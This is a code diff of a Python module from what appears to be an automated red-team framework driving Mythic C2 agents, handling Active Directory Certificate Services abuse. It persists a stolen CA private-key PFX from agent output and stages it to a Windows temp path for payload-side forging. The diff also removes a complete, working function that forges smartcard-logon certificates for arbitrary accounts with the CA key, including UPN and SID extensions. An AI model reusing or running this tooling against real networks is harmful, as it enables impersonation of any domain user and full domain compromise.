@@ -1,11 +1,11 @@
 """Runtime materialization for ADCS certificate-auth capabilities.
 
 The capability layer is intentionally payload-agnostic: it says "use verified CA
-signing material to obtain a PKINIT ticket", not how a given Mythic agent should
-stage files. This module handles the local, deterministic artifact step shared by
-all Mythic backends: resolve a verified CA artifact from the durable ledger,
-forge a Windows PKINIT/smartcard-style account PFX, and return builder-ready
-inputs. Mythic-specific staging is done by MythicTools after this module returns.
+signing material to obtain certificate-authenticated access", not how a given
+Mythic agent should stage files. This module handles only the deterministic local
+artifact resolution step shared by Mythic backends: resolve a verified CA PFX from
+the durable ledger and return builder-ready staging inputs. The target account
+certificate must be forged by a Mythic-tasked payload adapter, never by Sage.
 """
 
 from __future__ import annotations
@@ -44,6 +44,51 @@ _CA_ARTIFACT_KEYS = (
 )
 
 
+def persist_verified_ca_pfx_artifact(
+    output: Any,
+    artifact_dir: str | os.PathLike[str],
+    *,
+    engagement_key: str,
+    ca_host: str,
+    domain: str,
+) -> dict[str, str]:
+    """Persist one raw Mythic-exported CA PFX before the probe is redacted.
+
+    The durable probe intentionally does not retain ``PFX_BASE64``. This helper is
+    the one allowed handoff point from raw task output to a local artifact: it
+    validates the blob, verifies any declared SHA256, writes a deterministic file,
+    and returns only non-secret provenance fields for the ledger.
+    """
+
+    pfx_base64 = _output_field(output, "PFX_BASE64")
+    if not pfx_base64:
+        return {}
+    try:
+        blob = base64.b64decode(re.sub(r"\s+", "", pfx_base64), validate=True)
+    except Exception:
+        return {}
+    if len(blob) < 256 or blob[:1] != b"0":
+        return {}
+    sha256 = hashlib.sha256(blob).hexdigest()
+    declared_sha256 = _output_field(output, "PFX_SHA256").casefold()
+    if declared_sha256 and declared_sha256 != sha256:
+        return {}
+
+    artifact_root = Path(artifact_dir)
+    artifact_root.mkdir(parents=True, exist_ok=True)
+    slug = _slug("_".join(
+        part for part in (engagement_key, _host_short(ca_host), _normalize(domain), sha256[:16]) if part
+    ))
+    path = artifact_root / f"adcs_ca_signing_{slug}.pfx"
+    if not path.is_file() or hashlib.sha256(path.read_bytes()).hexdigest() != sha256:
+        path.write_bytes(blob)
+    return {
+        "pfx_artifact_path": str(path),
+        "pfx_artifact_sha256": sha256,
+        "pfx_sha256": sha256,
+    }
+
+
 def materialize_adcs_certificate_auth(
     *,
     ledger: dict[str, Any],
@@ -57,13 +102,15 @@ def materialize_adcs_certificate_auth(
     sid_extension_encoding: str = "utf8",
     ca_pfx_password: str = "",
     forged_pfx_password: str = "",
+    remote_ca_pfx_path: str = "",
     remote_forged_pfx_path: str = "",
 ) -> CertificateAuthMaterialization:
-    """Forge a certificate-auth PFX from a verified CA artifact.
+    """Resolve a verified CA PFX for payload-side certificate forging.
 
     A CA artifact is accepted only when the ledger has an achieved
     ``adcs-ca-private-key:<ca>@<domain>`` effect. The artifact directory is used
-    as a path resolver for that verified fact, not as independent proof.
+    as a path resolver for that verified fact, not as independent proof. Sage does
+    not use the CA private key to forge the target certificate itself.
     """
 
     domain = _normalize(domain)
@@ -100,11 +147,12 @@ def materialize_adcs_certificate_auth(
         caps_module=_caps,
     )
     forged_pfx_password = forged_pfx_password or _caps.artifact_secret("SageCert", slug)
+    remote_ca_pfx_path = remote_ca_pfx_path or f"C:\\Windows\\Temp\\sage_ca_signing_{slug}.pfx"
     remote_forged_pfx_path = remote_forged_pfx_path or f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
     subject_hint = f"{domain.split('.', 1)[0]}-ca"
 
     artifact_root = Path(artifact_dir)
-    ca_artifact, ca_hop = resolve_verified_ca_artifact(
+    ca_artifact, ca_hop, selected_ca_pfx_password = resolve_verified_ca_pfx_artifact(
         ledger,
         artifact_root,
         ca_host,
@@ -114,30 +162,42 @@ def materialize_adcs_certificate_auth(
         engagement_key=engagement_key,
     )
     if not ca_artifact:
+        usable_artifact, _ = resolve_verified_ca_artifact(
+            ledger,
+            artifact_root,
+            ca_host,
+            domain,
+            ca_pfx_password=ca_pfx_passwords,
+            subject_hint=subject_hint,
+            engagement_key=engagement_key,
+        )
+        if usable_artifact:
+            return CertificateAuthMaterialization(
+                False,
+                missing=["adcs_ca_private_key_pfx_artifact"],
+                reason=(
+                    "verified CA private-key material exists, but the payload-side certificate forge "
+                    "adapter requires a usable PFX artifact"
+                ),
+            )
         return CertificateAuthMaterialization(
             False,
             missing=["adcs_ca_private_key_artifact"],
-            reason=f"no verified usable CA private-key artifact for {ca_host}@{domain}",
+            reason=f"no verified usable CA private-key PFX artifact for {ca_host}@{domain}",
         )
 
     try:
-        pfx, forged_sha256, forged_subject, ca_subject = forge_account_pfx(
+        _ca_key, _ca_cert, ca_subject = load_ca_key_cert_from_artifact(
             ca_artifact,
-            ca_pfx_password=ca_pfx_passwords,
-            subject_hint=subject_hint,
-            account=account,
-            domain=domain,
-            account_sid=account_sid,
-            sid_extension_encoding=sid_extension_encoding,
-            forged_password=forged_pfx_password,
+            selected_ca_pfx_password,
+            subject_hint,
         )
     except Exception as exc:
         return CertificateAuthMaterialization(
             False,
             missing=["adcs_ca_private_key_artifact"],
-            reason=f"verified CA artifact could not be used for certificate auth: {exc}",
+            reason=f"verified CA PFX could not be used for payload-side certificate auth: {exc}",
         )
-    local_path = _write_forged_pfx(artifact_root, engagement_key, ca_host, domain, account, pfx)
     ca_artifact_sha256 = hashlib.sha256(ca_artifact.read_bytes()).hexdigest()
 
     inputs = {
@@ -146,33 +206,81 @@ def materialize_adcs_certificate_auth(
         "account": account,
         "ca_host": ca_host,
         "callback_id": callback_id,
-        "certificate_already_forged": True,
+        "ca_pfx_path": remote_ca_pfx_path,
+        "ca_pfx_password": selected_ca_pfx_password,
         "forged_pfx_path": remote_forged_pfx_path,
         "forged_pfx_password": forged_pfx_password,
-        "_local_forged_pfx_path": str(local_path),
-        "_ca_artifact_path": str(ca_artifact),
+        "_local_ca_pfx_path": str(ca_artifact),
     }
     if account_sid:
         inputs["account_sid"] = account_sid
     evidence = {
         "source": "adcs_certificate_materializer",
-        "certificate_profile": "windows-pkinit-smartcard-logon",
+        "materialization_mode": "stage-ca-pfx-for-payload-forge",
         "ca_host": ca_host,
         "domain": domain,
         "account": account,
         "account_sid": account_sid,
+        "sid_extension_encoding": sid_extension_encoding,
         "callback_id": callback_id,
         "ca_subject": ca_subject,
         "ca_artifact_path": str(ca_artifact),
         "ca_artifact_sha256": ca_artifact_sha256,
-        "forged_subject": forged_subject,
-        "forged_pfx_artifact_path": str(local_path),
-        "forged_pfx_sha256": forged_sha256,
+        "remote_ca_pfx_path": remote_ca_pfx_path,
         "remote_forged_pfx_path": remote_forged_pfx_path,
         "verified_effect": _ca_effect(ca_host, domain),
         "verified_hop_id": str(ca_hop.get("id") or ""),
     }
-    return CertificateAuthMaterialization(True, inputs=inputs, evidence=evidence, reason="materialized forged certificate PFX")
+    return CertificateAuthMaterialization(
+        True,
+        inputs=inputs,
+        evidence=evidence,
+        reason="materialized verified CA PFX for payload-side certificate forge",
+    )
+
+
+def resolve_verified_ca_pfx_artifact(
+    ledger: dict[str, Any],
+    artifact_dir: Path,
+    ca_host: str,
+    domain: str,
+    ca_pfx_password: str | list[str] | tuple[str, ...] | set[str] = "",
+    subject_hint: str = "",
+    engagement_key: str = "",
+) -> tuple[Path | None, dict[str, Any], str]:
+    """Return a verified CA PFX plus the exact password required by payload tooling."""
+    ca_host = _host_short(ca_host)
+    domain = _normalize(domain)
+    effect = _ca_effect(ca_host, domain)
+    for hop in reversed(list(ledger.get("hops") or [])):
+        if not isinstance(hop, dict):
+            continue
+        if str(hop.get("status") or "").casefold() != "achieved":
+            continue
+        effects = {str(hop.get("effect") or "").casefold()}
+        effects.update(str(item or "").casefold() for item in hop.get("satisfied_effects") or [])
+        if effect not in effects:
+            continue
+        evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
+        candidates, expected_sha256, provenance_present = _verified_artifact_candidates(
+            evidence,
+            artifact_dir,
+            engagement_key,
+            ca_host,
+            domain,
+        )
+        if provenance_present and expected_sha256 is None:
+            return None, hop, ""
+        for path in _dedupe_paths(candidates):
+            if not path.is_file() or path.suffix.casefold() != ".pfx":
+                continue
+            if expected_sha256 and _file_sha256(path) != expected_sha256:
+                continue
+            usable, selected_password = _usable_ca_pfx_password(path, ca_pfx_password, subject_hint)
+            if usable:
+                return path, hop, selected_password
+        return None, hop, ""
+    return None, {}, ""
 
 
 def resolve_verified_ca_artifact(
@@ -197,12 +305,19 @@ def resolve_verified_ca_artifact(
         if effect not in effects:
             continue
         evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
-        candidates = []
-        candidates.extend(_candidate_paths(evidence))
-        candidates.extend(_embedded_pfx_candidate_paths(evidence, artifact_dir, engagement_key, ca_host, domain))
-        candidates.extend(ca_artifact_candidates(artifact_dir, ca_host, domain, engagement_key=engagement_key))
+        candidates, expected_sha256, provenance_present = _verified_artifact_candidates(
+            evidence,
+            artifact_dir,
+            engagement_key,
+            ca_host,
+            domain,
+        )
+        if provenance_present and expected_sha256 is None:
+            return None, hop
         for path in _dedupe_paths(candidates):
             if not path.is_file():
+                continue
+            if expected_sha256 and _file_sha256(path) != expected_sha256:
                 continue
             if subject_hint:
                 try:
@@ -245,92 +360,6 @@ def ca_artifact_candidates(
         reverse=True,
     )
     return candidates
-
-
-def forge_account_pfx(
-    artifact: Path,
-    *,
-    ca_pfx_password: str | list[str] | tuple[str, ...] | set[str],
-    subject_hint: str,
-    account: str,
-    domain: str,
-    forged_password: str,
-    account_sid: str = "",
-    sid_extension_encoding: str = "utf8",
-) -> tuple[bytes, str, str, str]:
-    from datetime import datetime, timedelta, timezone
-
-    from cryptography import x509
-    from cryptography.hazmat.primitives import hashes, serialization
-    from cryptography.hazmat.primitives.asymmetric import rsa
-    from cryptography.hazmat.primitives.serialization import pkcs12
-    from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID, ObjectIdentifier
-
-    ca_key, ca_cert, ca_subject = load_ca_key_cert_from_artifact(artifact, ca_pfx_password, subject_hint)
-    cert_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-    account = _normalize(account)
-    domain = _normalize(domain)
-    upn = f"{account}@{domain}"
-    now = datetime.now(timezone.utc)
-    builder = (
-        x509.CertificateBuilder()
-        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, account)]))
-        .issuer_name(ca_cert.subject)
-        .public_key(cert_key.public_key())
-        .serial_number(x509.random_serial_number())
-        .not_valid_before(now - timedelta(days=1))
-        .not_valid_after(now + timedelta(days=365))
-        .add_extension(
-            x509.SubjectAlternativeName([
-                x509.OtherName(ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"), _der_utf8_string(upn)),
-                x509.RFC822Name(upn),
-            ]),
-            critical=False,
-        )
-        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
-        .add_extension(x509.SubjectKeyIdentifier.from_public_key(cert_key.public_key()), critical=False)
-        .add_extension(_authority_key_identifier(ca_cert, ca_key), critical=False)
-        .add_extension(_crl_distribution_points(ca_cert), critical=False)
-        .add_extension(
-            x509.ExtendedKeyUsage([
-                ExtendedKeyUsageOID.CLIENT_AUTH,
-                ObjectIdentifier("1.3.6.1.4.1.311.20.2.2"),
-            ]),
-            critical=False,
-        )
-        .add_extension(
-            x509.KeyUsage(
-                digital_signature=True,
-                content_commitment=False,
-                key_encipherment=True,
-                data_encipherment=False,
-                key_agreement=False,
-                key_cert_sign=False,
-                crl_sign=False,
-                encipher_only=False,
-                decipher_only=False,
-            ),
-            critical=True,
-        )
-    )
-    if account_sid:
-        builder = builder.add_extension(
-            _ntds_ca_security_extension(account_sid, sid_extension_encoding),
-            critical=False,
-        )
-    cert = builder.sign(private_key=ca_key, algorithm=hashes.SHA256())
-    algorithm = (
-        serialization.BestAvailableEncryption(forged_password.encode())
-        if forged_password else serialization.NoEncryption()
-    )
-    pfx = pkcs12.serialize_key_and_certificates(
-        name=upn.encode("utf-8"),
-        key=cert_key,
-        cert=cert,
-        cas=[ca_cert],
-        encryption_algorithm=algorithm,
-    )
-    return pfx, hashlib.sha256(pfx).hexdigest(), cert.subject.rfc4514_string(), ca_subject
 
 
 def load_ca_key_cert_from_artifact(
@@ -398,14 +427,6 @@ def load_ca_key_cert_from_artifact(
     return key, cert, subject
 
 
-def _write_forged_pfx(artifact_dir: Path, engagement_key: str, ca_host: str, domain: str, account: str, pfx: bytes) -> Path:
-    artifact_dir.mkdir(parents=True, exist_ok=True)
-    slug = _slug("_".join(part for part in (engagement_key, ca_host, domain, account) if part))
-    path = artifact_dir / f"adcs_forged_cert_{slug}.pfx"
-    path.write_bytes(pfx)
-    return path
-
-
 def _candidate_paths(evidence: dict[str, Any]) -> list[Path]:
     paths = []
     for source in _evidence_sources(evidence):
@@ -414,6 +435,46 @@ def _candidate_paths(evidence: dict[str, Any]) -> list[Path]:
             if text:
                 paths.append(Path(text))
     return paths
+
+
+def _verified_artifact_candidates(
+    evidence: dict[str, Any],
+    artifact_dir: Path,
+    engagement_key: str,
+    ca_host: str,
+    domain: str,
+) -> tuple[list[Path], str | None, bool]:
+    """Return candidates scoped to the achieved hop's own artifact provenance.
+
+    New export hops carry an artifact path plus SHA256. Once a SHA is present,
+    directory search is allowed only as a SHA-bound lookup; an unrelated older
+    run's PFX cannot satisfy the hop. Path-only current provenance fails closed if
+    the path is missing. Legacy hops with no artifact provenance at all retain the
+    old directory fallback so retained historical ledgers remain usable where
+    possible.
+    """
+
+    candidates = []
+    candidates.extend(_candidate_paths(evidence))
+    candidates.extend(_embedded_pfx_candidate_paths(evidence, artifact_dir, engagement_key, ca_host, domain))
+    expected_sha256, sha_field_present = _expected_pfx_sha256(evidence)
+    provenance_present = bool(candidates or sha_field_present)
+    if expected_sha256 or not provenance_present:
+        candidates.extend(ca_artifact_candidates(artifact_dir, ca_host, domain, engagement_key=engagement_key))
+    return candidates, expected_sha256, provenance_present
+
+
+def _expected_pfx_sha256(evidence: dict[str, Any]) -> tuple[str | None, bool]:
+    for source in _evidence_sources(evidence):
+        for key in ("pfx_artifact_sha256", "pfx_sha256", "ca_pfx_sha256", "PFX_SHA256"):
+            value = source.get(key) if isinstance(source, dict) else None
+            if value is None:
+                continue
+            text = str(value).strip().casefold()
+            if re.fullmatch(r"[0-9a-f]{64}", text):
+                return text, True
+            return None, True
+    return "", False
 
 
 def _embedded_pfx_candidate_paths(
@@ -445,6 +506,26 @@ def _embedded_pfx_candidate_paths(
             path.write_bytes(blob)
         paths.append(path)
     return paths
+
+
+def _output_field(output: Any, field: str) -> str:
+    if output is None:
+        return ""
+    text = output.decode(errors="replace") if isinstance(output, bytes) else str(output)
+    text = text.replace("\\r\\n", "\n").replace("\\n", "\n").replace("\\r", "\n")
+    pattern = re.compile(rf"(?im)^\s*{re.escape(field)}\s*[:=]\s*(.*?)\s*$")
+    for match in pattern.finditer(text):
+        value = match.group(1).strip().strip("'\"")
+        if value:
+            return value
+    return ""
+
+
+def _file_sha256(path: Path) -> str:
+    try:
+        return hashlib.sha256(path.read_bytes()).hexdigest()
+    except Exception:
+        return ""
 
 
 def _evidence_sources(evidence: dict[str, Any]) -> list[dict[str, Any]]:
@@ -488,100 +569,29 @@ def _public_key_bytes(value: Any) -> bytes:
     )
 
 
-def _authority_key_identifier(ca_cert: Any, ca_key: Any) -> Any:
-    from cryptography import x509
+def _usable_ca_pfx_password(
+    artifact: Path,
+    pfx_password: str | list[str] | tuple[str, ...] | set[str],
+    subject_hint: str,
+) -> tuple[bool, str]:
+    from cryptography.hazmat.primitives.serialization import pkcs12
 
     try:
-        issuer_ski = ca_cert.extensions.get_extension_for_class(x509.SubjectKeyIdentifier).value
-        return x509.AuthorityKeyIdentifier.from_issuer_subject_key_identifier(issuer_ski)
+        data = artifact.read_bytes()
     except Exception:
-        return x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key())
-
-
-def _crl_distribution_points(ca_cert: Any) -> Any:
-    from cryptography import x509
-
-    try:
-        return ca_cert.extensions.get_extension_for_class(x509.CRLDistributionPoints).value
-    except Exception:
-        return x509.CRLDistributionPoints([
-            x509.DistributionPoint(
-                full_name=[x509.UniformResourceIdentifier("ldap:///")],
-                relative_name=None,
-                reasons=None,
-                crl_issuer=None,
-            )
-        ])
-
-
-def _der_utf8_string(value: str) -> bytes:
-    data = value.encode("utf-8")
-    if len(data) < 128:
-        return b"\x0c" + bytes([len(data)]) + data
-    length = len(data).to_bytes((len(data).bit_length() + 7) // 8, "big")
-    return b"\x0c" + bytes([0x80 | len(length)]) + length + data
-
-
-def _ntds_ca_security_extension(account_sid: str, encoding: str = "utf8"):
-    from cryptography import x509
-    from cryptography.x509.oid import ObjectIdentifier
-
-    value = _der_octet_string(_sid_to_bytes(account_sid)) if str(encoding).casefold() in {"binary", "octet", "octet-string"} else _der_utf8_string(account_sid)
-    other_name = _der_sequence(
-        _der_oid("1.3.6.1.4.1.311.25.2.1")
-        + _der_context_explicit(0, value)
-    )
-    return x509.UnrecognizedExtension(ObjectIdentifier("1.3.6.1.4.1.311.25.2"), other_name)
-
-
-def _der_octet_string(value: bytes) -> bytes:
-    return b"\x04" + _der_length(len(value)) + value
-
-
-def _sid_to_bytes(value: str) -> bytes:
-    parts = str(value or "").strip().split("-")
-    if len(parts) < 3 or parts[0] != "S":
-        raise ValueError("invalid SID")
-    revision = int(parts[1])
-    identifier_authority = int(parts[2])
-    sub_authorities = [int(part) for part in parts[3:]]
-    if len(sub_authorities) > 255:
-        raise ValueError("too many SID subauthorities")
-    out = bytearray([revision, len(sub_authorities)])
-    out.extend(identifier_authority.to_bytes(6, "big"))
-    for sub_authority in sub_authorities:
-        out.extend(sub_authority.to_bytes(4, "little"))
-    return bytes(out)
-
-
-def _der_sequence(value: bytes) -> bytes:
-    return b"\x30" + _der_length(len(value)) + value
-
-
-def _der_context_explicit(index: int, value: bytes) -> bytes:
-    return bytes([0xA0 + index]) + _der_length(len(value)) + value
-
-
-def _der_oid(value: str) -> bytes:
-    parts = [int(part) for part in value.split(".")]
-    if len(parts) < 2:
-        raise ValueError("OID must have at least two arcs")
-    encoded = bytearray([40 * parts[0] + parts[1]])
-    for part in parts[2:]:
-        stack = [part & 0x7F]
-        part >>= 7
-        while part:
-            stack.append(0x80 | (part & 0x7F))
-            part >>= 7
-        encoded.extend(reversed(stack))
-    return b"\x06" + _der_length(len(encoded)) + bytes(encoded)
-
-
-def _der_length(length: int) -> bytes:
-    if length < 128:
-        return bytes([length])
-    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
-    return bytes([0x80 | len(raw)]) + raw
+        return False, ""
+    for password_text in _pfx_password_text_candidates(pfx_password):
+        password = password_text.encode() if password_text else None
+        try:
+            key, cert, _cas = pkcs12.load_key_and_certificates(data, password)
+        except Exception:
+            continue
+        if key is None or cert is None:
+            continue
+        if subject_hint and subject_hint.casefold() not in cert.subject.rfc4514_string().casefold():
+            continue
+        return True, password_text
+    return False, ""
 
 
 def _ca_pfx_password_values(
@@ -652,6 +662,18 @@ def _pfx_password_candidates(value: str | list[str] | tuple[str, ...] | set[str]
         if item not in deduped:
             deduped.append(item)
     return deduped
+
+
+def _pfx_password_text_candidates(value: str | list[str] | tuple[str, ...] | set[str]) -> list[str]:
+    out: list[str] = []
+    values = list(value) if isinstance(value, (list, tuple, set)) else [value]
+    for item in values:
+        text = str(item or "").strip()
+        if text and text not in out:
+            out.append(text)
+    if "" not in out:
+        out.append("")
+    return out
 
 
 def _ca_effect(ca_host: str, domain: str) -> str:
